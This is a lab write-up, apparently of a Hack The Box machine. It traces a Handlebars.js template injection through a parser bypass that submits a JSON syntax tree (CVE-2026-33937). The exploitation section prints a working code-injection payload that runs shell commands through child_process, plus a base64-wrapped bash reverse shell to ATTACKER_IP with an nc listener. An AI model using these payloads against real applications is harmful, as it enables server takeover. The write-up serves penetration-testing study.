**Why that's dangerous.** Filling in blanks is not a copy-paste operation. A piece of software reads the letter, understands it, and acts on it — and that software understands more than blanks. It understands instructions.

`{{#if true}}yes{{/if}}` is an instruction: _if this condition holds, print "yes."_ Submitting it returned `yes`. Not the instruction — the _result_ of following it. The server did not store the text. It read it, understood it as a command, obeyed it, and published the outcome.

This particular instruction is harmless. The question it opens is what else will be obeyed.

**What language is this?** The component reading these instructions is **Handlebars**. It is not a general-purpose programming language; it is a small special-purpose one built for filling in form letters.

It is written in JavaScript and runs inside JavaScript programs. That matters enormously: Handlebars is a small language living _inside_ a big one. If you can get from the small language into the big one, the big one can read files, open network connections, and run system commands. The rest of this box hangs on that door.
<div align="center"> <br> <br> </div>

##### How the vulnerability was identified, and why these probes

Three observations stacked up, none sufficient alone.

The response headers carried a cookie named `dz.sid` beginning `s%3A` — a signature of Express, a JavaScript web framework. So: JavaScript on the server. Filed away.

The Essentials page then described its own behaviour: when a character joins a campaign, a message is written to the log. Text is being generated from user input. Filed away.

Then the form itself. The placeholder text in the message box printed `{{race}} {{class}} {{name}}` on screen — the application demonstrating its own template syntax in the hint text, on a field it invites the user to overwrite. Curly-brace syntax plus a JavaScript server points specifically at Handlebars.

The reasoning: JavaScript server + user writes the form letter + curly braces = probably Handlebars, probably compiled server-side. A hypothesis, not a finding. `{{#if true}}yes{{/if}}` was the cheapest experiment capable of proving or killing it.

**Why the conditional specifically.** Because it cannot be faked. Submitting `{{name}}` and receiving `Testchar` proves less than it appears — a lazy developer achieves the same with plain find-and-replace: search for `{{name}}`, swap in the value, done. No understanding, no execution, just swapping.

Find-and-replace cannot produce `yes` from `{{#if true}}yes{{/if}}`. Something must recognise `#if` as a conditional, locate its matching close tag, isolate the body between them, evaluate `true`, and decide to emit. That is comprehension, not substitution.

The habit worth keeping: choose a probe whose result can _only_ be explained by execution. `{{7*7}}` returning `49` works the same way in other engines — nothing copies `7*7` and accidentally produces `49`.
<div align="center"> <br> <br> </div>

##### Logic-less by design, and where the restriction lives

Handlebars markets itself as a _logic-less_ engine. The philosophy is that templates should describe presentation rather than do computation.

In practice the language is intentionally crippled. No arithmetic. No arbitrary function calls. No attribute chains walking into the host runtime. What remains is path lookups, string and number literals, and a fixed set of built-in helpers — `if`, `unless`, `each`, `with`, `lookup`, `log` — plus whatever the developer registered.

This is why Handlebars injection is harder than injection into Jinja2 or Twig. There, the template language itself performs arithmetic, indexes into objects, and walks attribute chains until it reaches something dangerous like `os.system`; code execution is often achievable using nothing but the language's own features. Handlebars offers none of that. The language is too small to escape from.

But note _where_ the restriction is implemented. It is not a runtime check. It is the **grammar**, enforced by the parser, at the moment text becomes a syntax tree. `{{7*7}}` fails because the parser cannot construct a node for it — the failure occurs before anything is compiled or rendered.

Recall the two-stage design from 2.3.3. Stage one parses text into a tree. Stage two compiles that tree into a JavaScript function and runs it. Every safety property of the language lives in stage one. Stage two is written on the assumption that its input came from stage one and is therefore well-formed — it validates nothing, because the parser already guaranteed everything.

So the question is not "how do I write a template that escapes Handlebars?" That question has no answer; the grammar forbids it. The question is: **is there any way to hand the compiler a tree the parser never saw?**

If so, none of the restrictions apply — not because they were bypassed, but because the code enforcing them never ran.

**Next:** Determine how the message field is transmitted to the server, and whether the transport permits sending anything other than a plain string.
<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.3.7 Capture the save request and identify the transport encoding

**Why this step:** Every probe so far has been submitted through the browser form, and each was constrained by the Handlebars grammar. Inspect the actual HTTP request to determine the endpoint, method, and the encoding used to transmit the template field.

**Action:**

Open DevTools (F12), select the **Network** tab, then click SAVE CHANGES on `http://dzcampaigns.htb/character/<id>/edit`. Select the request named `<id>` and read the Headers sub-tab.

**Result:**

![[dzcampaigns_devtools_network_save.png]]

General:

```
Request URL:      http://dzcampaigns.htb/character/15
Request Method:   POST
Status Code:      302 Found
Remote Address:   TARGET_IP:80
Referrer Policy:  strict-origin-when-cross-origin
```

Request Headers:

```
Content-Type:     application/x-www-form-urlencoded
Content-Length:   142
Host:             dzcampaigns.htb
Origin:           http://dzcampaigns.htb
Referer:          http://dzcampaigns.htb/character/15/edit
Cookie:           dz.sid=s%3AFm3wH_F9QgIP35oZHKCjdS-fIjoiTjoV.9EVBxQvlIJP%2FQerzDUID3FXj9TLCohrl0S%2FgrvfKvRc
```

Response Headers:

```
Connection:       keep-alive
Content-Length:   39
Content-Type:     text/html; charset=utf-8
Server:           nginx/1.24.0 (Ubuntu)
Location:         /dashboard
Set-Cookie:       dz.sid=s%3AFm3wH_F9QgIP35oZHKCjdS-fIjoiTjoV.9EVBxQvlIJP%2FQerzDUID3FXj9TLCohrl0S%2FgrvfKvRc
```

**What this gives you:** The exact request contract for template submission.

**Key findings:**

- The update endpoint is `POST /character/15`. The edit form is served at `/character/15/edit` but submits to `/character/15`, confirmed by the `Referer` header. The response is a 302 redirect to `/dashboard`, which is why no character detail page is ever displayed.
- **The transport is `application/x-www-form-urlencoded`.** This is the browser's default HTML form encoding and it is strictly flat — key–value pairs of text, with no capacity to represent numbers, arrays, or nested objects. Every field submitted through the browser therefore arrives at the server as a **string**, including `campaign_message`. The string is passed to Handlebars, which parses it, and every parser-level restriction applies. This fully explains the probe results in 2.3.6: the grammar rejected `{{7*7}}` because a string is all the server ever received.
- The encoding is a property of the browser form, not of the endpoint. Nothing in the request or response indicates the server accepts only this content type.
- Session state is carried entirely in the `dz.sid` cookie, which is reissued on each response. Any request constructed outside the browser must carry this cookie to authenticate.
- The response is a 302 with `Content-Length: 39` — a redirect stub, not rendered content. Template output is never returned in the response to the save request and must be retrieved separately from `/campaign/1`.

<div align="center"> <br> <br> </div>

##### Why the encoding of a request decides what an attacker can send

Two formats commonly carry data in a POST body, and the difference between them is the hinge this entire box turns on.

**Form encoding** (`application/x-www-form-urlencoded`) is what an HTML form produces:

```
name=Testchar&race=Elf&class=Rogue&campaign_message=%7B%7B77%7D%7D
```

Flat pairs joined by `&`, special characters percent-escaped. There is no syntax for nesting and no syntax for types. Whatever is written, the server receives text. To send the number 77 you send the characters `7` and `7`. To send a structure — an object with fields inside it — the format simply cannot express it.

**JSON** (`application/json`) can express all of it:

```json
{
  "name": "Testchar",
  "campaign_message": {
    "type": "Program",
    "body": [ ... ]
  }
}
```

Here `campaign_message` is not text at all. It is an object, with nested objects, arrays, numbers, booleans inside it. The server receives a real data structure, not characters to be parsed.

Express applications very often accept both, because it costs one line of configuration and makes the API usable by JavaScript front-ends as well as plain forms:

```javascript
app.use(express.urlencoded({ extended: true }));  // handles form posts
app.use(express.json());                          // handles JSON posts
```

A browser form will only ever send the first kind. Nothing stops an attacker from sending the second — with `curl`, with a Python script, or from the browser's own JavaScript console.

Handlebars takes a _string_, parses it into a _tree_, then compiles the tree. If the application hands Handlebars a string, the parser stands between the attacker and the compiler. If the application can instead be handed a tree directly — an object rather than text — the parser is skipped entirely, and every safety property it was providing evaporates.

An endpoint that accepts JSON is an endpoint where `campaign_message` can be an object instead of a string. That is the question to answer next.

**Next:** Test whether the update endpoint accepts a JSON-encoded request body.
<div align="center">
<br>
<br>
</div>

##### Why JSON became the next test

This is the reasoning, in order. Each link only makes sense given the one before it.

**Handlebars works in two stages, not one.** Give it a template string and it first _parses_ — reads the characters, checks them against its grammar, and builds a tree structure describing what the template means. Then it _compiles and executes_ that tree to produce output. Two distinct phases, and the tree in the middle is a real data structure the library passes from one phase to the other.

**Your probes in 2.3.6 established exactly where the wall is.** `{{#if true}}yes{{/if}}` rendered as `yes`, so your input is definitely being compiled server-side — that's SSTI confirmed. But `{{7*7}}` didn't return `49` and didn't return empty; it threw a server error. That error came from the _parser_, because `*` is not a legal character in a Handlebars path. And this is the bit that matters: Handlebars, unlike Jinja2 or FreeMarker, has no expression evaluation at all. No arithmetic, no method calls, no attribute chains. The language is deliberately logic-less.

**So the normal SSTI playbook is dead.** Every classic payload — walking up an object chain to reach a subprocess module, calling a constructor, evaluating arithmetic — needs a template language that can express computation. This one can't. And you can't smuggle it past the parser, because the parser is precisely the thing rejecting it. As long as your input arrives as a _string_, the parser stands between you and the compiler, and it will refuse anything interesting.

**Which reframes the problem.** The question stops being "what string gets past the parser" and becomes **"can I avoid the parser entirely?"** The compiler doesn't want a string. It wants a tree. If you could hand the engine a tree directly, the parser never runs, and every restriction it was enforcing simply isn't in the path anymore. Its grammar rules only apply to text being converted into a tree.

**So: can you send a tree?** That's now a question about the request format, which is why the `Content-Type` line matters. `application/x-www-form-urlencoded` is flat by design — `key=value&key=value`, percent-escaped text, no nesting, no types. It has no way to express an object with objects inside it. Send it whatever you like and the server receives characters. Under that encoding, `campaign_message` _cannot_ be anything but a string, which is why the parser was unavoidable.

**JSON can express a tree.** Nested objects, arrays, numbers, booleans. Under JSON, `campaign_message` can be an object rather than text, and the server would receive an actual structure.

**And the encoding was never the endpoint's choice.** This is the step people skip. A browser form can only ever send form-encoding — that's a limitation of HTML forms, not of the server. Meanwhile Express apps very commonly enable both parsers, because it's two lines of setup and makes the API usable from JavaScript front-ends:

```javascript
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
```

Nothing in the captured request or response says the server _only_ accepts form-encoding. You observed the browser's default, and mistook it for a constraint. `curl` is under no such obligation.
<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.3.8 Test whether the update endpoint accepts a JSON request body

**Why this step:** The browser form transmits `campaign_message` as form-encoded text, forcing the value through the Handlebars parser. Determine whether the same endpoint accepts `application/json`, which would permit sending structured objects instead of strings.

**Command:**

At `http://dzcampaigns.htb/character/15/edit`, open DevTools → Console and execute:

```javascript
const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    name: "Testchar",
    race: "Elf",
    class: "Rogue",
    backstory: "test",
    campaign_message: "JSON path works"
  })
});
console.log(r.status, await r.text());
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`fetch("/character/15", ...)`|Issues an HTTP request from the page|Sends a request by hand instead of clicking the button|
|`await`|Waits for the response before continuing|Pause here until the server replies|
|`method: "POST"`|Matches the save request captured in 2.3.7|Same verb the form uses|
|`credentials: "same-origin"`|Attaches the `dz.sid` session cookie|Keeps you logged in for this request|
|`"Content-Type": "application/json"`|**Declares the body as JSON**|Tells the server to expect structured data, not form text|
|`JSON.stringify({...})`|Serialises the object into a JSON body|Converts the data into what gets sent|
|`campaign_message: "JSON path works"`|Plain string marker|Tests the transport only — no payload|
|`console.log(r.status, await r.text())`|Prints status code and response body|Shows what came back|

Executing from the browser console rather than an external tool means the request originates from the application's own origin and carries the session cookie automatically. The request is otherwise identical to the form submission except for the declared content type.

**Result:**

```
403 '<!DOCTYPE html>
...
<main class="page">
    <div class="error-box">
  <h2>Something Went Amiss</h2>

  <p>Invalid CSRF token</p>

  <div class="error-actions">
    <a class="action-btn" href="/" data-action="back">&larr; Go Back</a>
  </div>
</div>
  </main>
...
<input type="hidden" name="_csrf" value="88e19735640c2f42b7846c67cacebb3723181c3b3cf1723a426d22cc4dd463c4">
...'
```

**What this gives you:** Confirmation that JSON bodies are parsed, and identification of the single remaining obstacle.

**Key findings:**

- **The endpoint accepts `application/json`.** The rejection reason is `Invalid CSRF token` — not a parse failure, not an unsupported media type, not a missing-field error. Reaching CSRF validation requires the body to have been deserialised first: the server read the JSON, searched it for a `_csrf` property, and rejected the request when none was present. Express is therefore running JSON body-parsing middleware alongside the form-encoded handler.
- CSRF protection is enforced on the update endpoint and applies to JSON requests identically to form requests. The token is expected as a request-body field named `_csrf`, not as a header.
- The token value is rendered into the HTML of application pages as a hidden input: `<input type="hidden" name="_csrf" value="..." />`. Any page loaded in an authenticated session contains a valid token, so it can be read from the DOM at request time rather than hard-coded.
- The failed request wrote nothing. CSRF validation occurs before any processing of `campaign_message`.

<div align="center"> <br> <br> </div>

##### What CSRF tokens are and why one appeared here

Cross-Site Request Forgery is an attack where a malicious website causes your browser to send a request to a site you are logged into. Because browsers attach cookies automatically to any request bound for a given domain, that forged request arrives fully authenticated. A hidden form on an attacker's page could silently submit a password change or a funds transfer on your behalf.

The standard defence is a token. When the server renders a page containing a form, it embeds a random secret in that page as a hidden field and remembers it against your session. On submission, the server checks the submitted token matches. An attacker's site can make your browser send a request, but it cannot read the contents of pages on another domain, so it cannot learn the token. No token, no request.

Two consequences matter here.

The token is not an obstacle to us, because we are not a third-party site — we are operating inside the application's own origin with a legitimate session. Every page we can load contains a valid token, and JavaScript running on that page can read it with a single DOM query. CSRF protection defends against forged cross-site requests; it does nothing against a logged-in user deliberately crafting their own.

More usefully, the error functioned as an **oracle**. A generic rejection would have told us nothing about whether the endpoint understood JSON. Instead the server named precisely which check failed — and that check sits downstream of body parsing. The specificity of an error message frequently reveals how far into a request-handling pipeline you got, and that information is worth more here than the request succeeding would have been.

**Next:** Include a valid CSRF token read from the page DOM and re-issue the JSON request to confirm the JSON path is functional end to end.

<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.3.9 Confirm the JSON path with a valid CSRF token

**Why this step:** The JSON body was parsed but rejected for a missing CSRF token. Supply a valid token read from the page DOM to establish that the JSON submission path is fully functional.

**Command:**

At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:

```javascript
const csrf = document.querySelector('[name="_csrf"]').value;

const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf,
    name: "Testchar",
    race: "Elf",
    class: "Rogue",
    backstory: "test",
    campaign_message: "JSON path works"
  })
});
console.log(r.status, await r.text());
```

**Breakdown:**

| Component                                  | Purpose                                                      | Simple Explanation                                      |
| ------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------- |
| `document.querySelector('[name="_csrf"]')` | Selects the first element with a `name` attribute of `_csrf` | Finds the hidden anti-forgery field on the current page |
| `.value`                                   | Reads the element's value                                    | Extracts the token itself                               |
| `_csrf: csrf`                              | Includes the token in the JSON body                          | Satisfies the check that rejected the previous request  |

All other parameters are unchanged from 2.3.8. Because the token is read from the DOM, this must be run on a page that renders one — any authenticated page qualifies.

**Result:**

```
200 '<!DOCTYPE html>
...
<h1>Dashboard</h1>
<p class="subtitle">Welcome back, nedmoeca@nimbaya.com.</p>
...
<span class="character-name">Testchar</span>
<span class="character-meta">&mdash; Elf Rogue</span>
<a class="action-btn" href="/character/15/inventory">Inventory</a>
<a class="action-btn" href="/character/15/edit">Edit</a>
<input type="hidden" name="_csrf" value="88e19735640c2f42b7846c67cacebb3723181c3b3cf1723a426d22cc4dd463c4">
...'
```

At `http://dzcampaigns.htb/campaign/1`:

```
JSON path works
Tue Jul 28 2026 21:58:22 GMT+0000 (Coordinated Universal Time)
```

![[dzcampaigns_json_message_rendered.png]]

**What this gives you:** A working out-of-band submission channel not constrained by the HTML form.

**Key findings:**

- The JSON path is fully functional. Status 200 with a valid token; the endpoint processes `application/json` bodies alongside form-encoded ones, meaning every field — including `campaign_message` — can be transmitted as any JSON type rather than being restricted to a string.
- The CSRF token is session-scoped, not single-use. The value `88e19735640c2f42b7846c67cacebb3723181c3b3cf1723a426d22cc4dd463c4` was harvested from the 403 error page, accepted for this request, and returned again in this response. A token scraped once can be reused across multiple requests within the same session.
- The 200 response body is the rendered `/dashboard` page rather than a 302 redirect stub. JSON requests receive page content directly, and that content contains fresh `_csrf` values, so a scripted client can extract the next token from the previous response without an additional page fetch.
- The client-side `disabled` attribute on the creation form's message field (2.3.3) is irrelevant on this path. Field gating implemented in the browser has no bearing on a request constructed directly.
- The value submitted via JSON is stored and rendered identically to one submitted via the form. The JSON path is not a partial or degraded route — it reaches the same template-rendering pipeline.

**Submission channel established:**

```
POST /character/15
Content-Type: application/json
Cookie: dz.sid=<session>
Body: { "_csrf": "<token>", "name": ..., "race": ..., "class": ...,
        "backstory": ..., "campaign_message": <any JSON type> }
→ 200, output rendered at /campaign/1
```

**Next:** Determine whether the application coerces `campaign_message` to a string before templating, or accepts a structured object — which would indicate the value reaches the compiler without passing through the parser.
<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.3.10 Submit a structured object as the template field

**Why this step:** The JSON channel is functional, but whether the application treats `campaign_message` as a string or as a structure is undetermined. Submit a JSON object in place of the string to observe how the value is handled.

**Command:**

At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:

```javascript
const csrf = document.querySelector('[name="_csrf"]').value;

const ast = {
  type: "Program",
  body: [{
    type: "ContentStatement",
    value: "AST_ACCEPTED",
    original: "AST_ACCEPTED",
    loc: { start: { line: 1, column: 0 }, end: { line: 1, column: 12 } }
  }],
  strip: {},
  loc: { start: { line: 1, column: 0 }, end: { line: 1, column: 12 } }
};

const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf,
    name: "Testchar",
    race: "Elf",
    class: "Rogue",
    backstory: "test",
    campaign_message: ast
  })
});
console.log(r.status, await r.text());
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`type: "Program"`|Root node of a Handlebars syntax tree|"This is a whole template"|
|`body: [ ... ]`|Ordered list of child nodes|The parts the template is made of|
|`type: "ContentStatement"`|A literal-text node|"This bit is just plain writing, not a placeholder"|
|`value` / `original`|The literal text carried by the node|The words to print|
|`loc`|Source position, as nested `start`/`end` objects|Where in the original text this came from|
|`strip`|Whitespace-control flags|Governs trimming around the node|
|`campaign_message: ast`|Sends the object rather than a string|Hands over a structure instead of text|

The payload is inert by design — a template consisting of nothing but the literal string `AST_ACCEPTED`. It tests handling, not exploitation. The `loc` values are populated with real objects rather than `null` because the compiler dereferences `loc.start.line` during code generation and raises a TypeError on a null value.

**Result:**

```
200 '<!DOCTYPE html>...<h1>Dashboard</h1>...<span class="character-name">Testchar</span>...'
```

At `http://dzcampaigns.htb/campaign/1`:

```
AST_ACCEPTED
Tue Jul 28 2026 22:21:26 GMT+0000 (Coordinated Universal Time)
```

![[dzcampaigns_ast_accepted.png]]

**What this gives you:** Decisive evidence about how the field is consumed, and a confirmed parser bypass.

**Key findings:**

- **The object is not coerced to a string.** JavaScript string conversion of an object yields the literal text `[object Object]`. Had the application called `String()`, `toString()`, or performed string concatenation on `campaign_message` before templating, the campaign page would display `[object Object]`. It displays `AST_ACCEPTED` instead — the text carried inside the object's `ContentStatement` node.
- **The object is consumed as a Handlebars syntax tree.** The application branches on the type of `campaign_message`: strings are parsed, objects are passed directly to the compiler as pre-parsed AST. The node structure was traversed, the `ContentStatement` recognised, and its `value` property emitted.
- **The parser is bypassed.** Every grammatical restriction observed in 2.3.6 — the rejection of `{{7*7}}`, the absence of arithmetic, the limited helper set — is enforced by the parser at stage one. Submitting a tree skips stage one entirely. Those restrictions are not defeated; the code enforcing them never runs.
- A complete `loc` object is required on every node. The compiler reads `loc.start.line` during code generation, so nodes carrying `loc: null` raise a TypeError and produce a server-side exception rather than rendered output.

**Comparison of `campaign_message` handling:**

|Value sent|Encoding|Result|Interpretation|Simple Explanation|
|---|---|---|---|---|
|`"{{#if true}}yes{{/if}}"`|form|Renders `yes`|Parsed as a template string|Read as instructions, obeyed|
|`"{{7*7}}"`|form|Server error|Parser rejected invalid grammar|Refused — not valid template syntax|
|`"JSON path works"`|JSON|Renders verbatim|Parsed as a template string|Read as instructions, none found, printed as-is|
|`{ type: "Program", ... }`|JSON|Renders `AST_ACCEPTED`|**Consumed as a pre-parsed syntax tree**|Handed over as a ready-made structure the server used directly|

<div align="center"> <br> <br> </div>

##### Why "no `[object Object]`" is the whole finding

This deserves dwelling on, because the _absence_ of a particular output is doing more work here than any error message could.

In JavaScript, forcing an object into a string position produces a fixed, useless result:

```javascript
"Hello " + { a: 1 }         // "Hello [object Object]"
String({ type: "Program" }) // "[object Object]"
```

The object's contents are discarded entirely. Every object collapses to the same nine characters.

Consider what the application must be doing for each possible outcome.

If the code were `Handlebars.compile(String(campaign_message))`, an object argument would become `"[object Object]"`. Handlebars would parse that harmless text, find no placeholders, and render it unchanged. The campaign page would read `[object Object]`.

If instead the code branches — using the value as a template string when it is a string, and as a pre-parsed AST when it is an object — then an object goes straight to the compiler. The compiler assumes it received parser output, walks the tree, and emits according to each node's type. A `ContentStatement` yields its `value` verbatim.

`AST_ACCEPTED` on the page confirms the second branch. **`campaign_message` reaches Handlebars as a syntax tree when submitted as an object.**

That is the vulnerability in full. This is CVE-2026-33937 — an AST type-confusion issue in Handlebars.js, tracked as GHSA-2w6w-674q-4c4q. The library's threat model assumes trees originate from its own parser; nothing validates a tree supplied from elsewhere.

<div align="center"> <br> <br> </div>

##### What the compiler does with a node's `value`

Handlebars compiles rather than interprets. Given a tree, it generates JavaScript source text and then evaluates that source into a real function — an approach taken for speed, since rendering the same template repeatedly then costs one function call instead of a full tree walk each time.

Generation is largely textual. For a literal, the compiler writes the value into the output as a constant. For a helper invocation, it writes something along the lines of `helpers.lookup.call(context, arg1, arg2)`, filling the argument slots from the node's `params`.

For a `NumberLiteral` node the compiler does the obvious thing: it takes the node's `value` property and writes it into the generated source as a numeric constant. It does not quote it, because numbers do not need quoting. It does not validate it, because the parser guarantees that a `NumberLiteral` produced by parsing contains an actual number — the grammar makes anything else impossible.

That guarantee is exactly what is lost when a tree arrives from outside. Place a _string of JavaScript_ in a `NumberLiteral`'s `value` and the compiler writes that string, unquoted and unvalidated, directly into the source of the function it is about to build. Whatever the string says becomes part of the program.

The technique from there is ordinary code injection. The injected text closes the parenthesis of the call it was written into, appends whatever expression is wanted, and comments out the remainder of the generated line so leftover syntax does not cause a parse error. This is the same shape as SQL injection, with generated JavaScript in place of a generated query.

**Next:** Construct a `MustacheStatement` invoking the `lookup` helper with a malformed `NumberLiteral` parameter, injecting JavaScript into the generated function to achieve command execution.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※ <br> </div> <!-- PAGE BREAK --> <div style="page-break-after: always;"></div> 

## 3. Exploitation / Initial Access

### 3.1 Achieve remote code execution via crafted Handlebars AST (CVE-2026-33937)

**Why this step:** The application consumes `campaign_message` as a pre-parsed syntax tree when submitted as a JSON object, bypassing the parser entirely. Construct a tree containing a node the parser could never produce, injecting JavaScript into the function the compiler generates.

**Command:**

At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:

```javascript
const csrf = document.querySelector('[name="_csrf"]').value;
const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };

const ast = {
  type: "Program",
  body: [{
    type: "MustacheStatement",
    path: {
      type: "PathExpression", data: false, depth: 0,
      parts: ["lookup"], original: "lookup", loc: L
    },
    params: [
      { type: "PathExpression", data: false, depth: 0,
        parts: [], original: "this", loc: L },
      { type: "NumberLiteral",
        value: "{},{})) + process.mainModule.require('child_process').execSync('id').toString() //",
        original: 1, loc: L }
    ],
    escaped: true,
    strip: { open: false, close: false },
    loc: L
  }],
  strip: {},
  loc: L
};

const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue",
    backstory: "test", campaign_message: ast
  })
});
console.log(r.status, await r.text());
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`const L = {...}`|Reusable `loc` object shared by every node|Satisfies the compiler's position lookups without repeating the object|
|`type: "MustacheStatement"`|An expression node — the compiler emits a helper call for it|An instruction, not plain text|
|`path.parts: ["lookup"]`|Names the built-in `lookup` helper as the call target|"Call the function named lookup"|
|First param: `PathExpression`, `parts: []`, `original: "this"`|Passes the current context object as argument one|"Here's the data object to search"|
|Second param: `NumberLiteral`|**The injection point** — its `value` is written into generated source unquoted|Where a number should go, JavaScript goes instead|
|`{},{}))`|Supplies two dummy arguments and closes the generated call|Finishes the sentence the compiler started|
|`+ process.mainModule.require('child_process')`|Reaches Node's module system from the template runtime|Opens the door from template-land into the real language|
|`.execSync('id')`|Executes a shell command synchronously and returns its output|Runs `id` on the server and waits for the answer|
|`.toString()`|Converts the returned Buffer to text|Makes the raw bytes printable|
|`//`|JavaScript line comment|Discards whatever the compiler wrote after the injection|
|`original: 1`|Retains a plausible source representation|Cosmetic; the compiler consumes `value`, not `original`|

**Result:**

Console returns `200` with the rendered dashboard page.

At `http://dzcampaigns.htb/campaign/1`:

```
uid=996(darkzero) gid=987(darkzero) groups=987(darkzero)
Wed Jul 29 2026 10:04:51 GMT+0000 (Coordinated Universal Time)
```

![[dzcampaigns_rce_id.png]]

**What this gives you:** Arbitrary command execution on the target as the web application's service account.

**Key findings:**

- **Remote code execution confirmed.** The command `id` executed on the server and its output was rendered into the campaign page. Any shell command can be substituted.
- The execution context is `uid=996(darkzero) gid=987(darkzero)`. A UID below 1000 marks this as a system service account rather than an interactive user — the identity the Node.js process runs under. Code executes with exactly the web application's privileges, no more.
- The injected JavaScript reached `process.mainModule.require`, meaning the template runtime has unrestricted access to Node's module system. No sandbox, VM isolation, or module allowlist constrains the compiled template.
- Output is returned through the campaign page rather than the HTTP response, making this a blind-adjacent but fully readable execution channel. Each command requires one POST followed by one GET of `/campaign/1`.
- The payload is stored. The malicious tree persists in the database and re-executes whenever the message is re-rendered.
<div align="center"> <br> <br> </div>

##### How the injected string becomes executable code

Recall from 2.3.10 that Handlebars generates JavaScript source text and then evaluates it. For a helper invocation with parameters, the generated source contains a call resembling:

```javascript
helpers.lookup.call(depth0, depth0, 1, {name:"lookup", hash:{}, data:data})
```

The `1` in that line came from a `NumberLiteral` node's `value` property, written in directly with no quoting — because a number needs none — and no validation — because the parser guaranteed it was a number.

Substituting the crafted string for that `1` produces:

```javascript
helpers.lookup.call(depth0, depth0, {},{})) + process.mainModule.require('child_process').execSync('id').toString() //, {name:"lookup", hash:{}, data:data})
```

Read left to right. `{},{}` supplies two throwaway arguments so the call has a sensible shape. The `))` closes both the argument list and the enclosing expression the compiler had opened. From that point the parser is outside the call, so `+ process.mainModule.require(...)` is simply string concatenation appended to the result — a perfectly ordinary JavaScript expression. It executes, `execSync` runs the shell command, `.toString()` renders the output as text, and that text becomes what the template emits. The trailing `//` comments out everything the compiler wrote afterwards, so the leftover `, {name:"lookup"...})` never causes a syntax error.

Structurally this is identical to SQL injection: close the construct you were placed inside, append your own, comment out the remainder. The only difference is that the generated artefact is a JavaScript function rather than a query.

The reason `process.mainModule.require` is used rather than a bare `require` is scope. Inside the generated function, `require` is not in scope — the function is built by `new Function(...)`, which does not inherit the enclosing module's variables. But `process` is a true global in Node, available everywhere, and `process.mainModule` references the entry-point module object, which carries its own `require`. That indirection is the standard route from an isolated JavaScript context back into Node's module system.

**Next:** Upgrade single-command execution to an interactive reverse shell for practical post-exploitation.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.2 Upgrade to an interactive reverse shell

**Why this step:** Single-command execution requires a POST followed by a page load for each command, and returns output through a public web page. Establish a persistent interactive shell for practical post-exploitation.

**Commands:**

On the attacking host, start a listener:

```bash
nc -lvnp 4444
```

At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:

```javascript
const csrf = document.querySelector('[name="_csrf"]').value;
const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };

const cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";
const b64 = btoa(cmd);
const payload = `{},{})) + process.mainModule.require('child_process').exec('echo ${b64} | base64 -d | bash') //`;

const ast = {
  type: "Program",
  body: [{
    type: "MustacheStatement",
    path: { type: "PathExpression", data: false, depth: 0,
            parts: ["lookup"], original: "lookup", loc: L },
    params: [
      { type: "PathExpression", data: false, depth: 0,
        parts: [], original: "this", loc: L },
      { type: "NumberLiteral", value: payload, original: 1, loc: L }
    ],
    escaped: true,
    strip: { open: false, close: false },
    loc: L
  }],
  strip: {},
  loc: L
};

const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue",
    backstory: "test", campaign_message: ast
  })
});
console.log(r.status);
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`nc -lvnp 4444`|Listener: `-l` listen, `-v` verbose, `-n` no DNS, `-p` port|Waits for the target to call back|
|`bash -i`|Interactive bash|A shell that accepts typed commands|
|`>& /dev/tcp/ATTACKER_IP/4444`|Redirects stdout and stderr to a TCP socket|Sends everything the shell prints to your listener|
|`0>&1`|Redirects stdin from the same socket|Lets what you type reach the shell|
|`btoa(cmd)`|Base64-encodes the command in the browser|Avoids quoting `>&` and `0>&1` through three nested layers|
|`echo <b64> \| base64 -d \| bash`|Decodes and executes server-side|Unpacks the command and runs it|
|`.exec(...)`|**Asynchronous** child process|Returns immediately instead of waiting|

`exec` replaces `execSync` here deliberately. The synchronous variant blocks until the child exits, and a reverse shell never exits — the HTTP request would hang and time out before a prompt appeared.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/DarkZeroReturns]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.227] from (UNKNOWN) [10.129.54.208] 56902
bash: cannot set terminal process group (756): Inappropriate ioctl for device
bash: no job control in this shell
darkzero@SRV01:~$
```

**What this gives you:** An interactive foothold on the target as the web service account.

**Key findings:**

- Interactive shell obtained as `darkzero` on host `SRV01`.
- The hostname identifies this as the Linux application server. Earlier reconnaissance flagged Windows characteristics behind a Linux edge host (1.2, 2.1.3); SRV01 is that edge host, and the Windows environment lies beyond it.
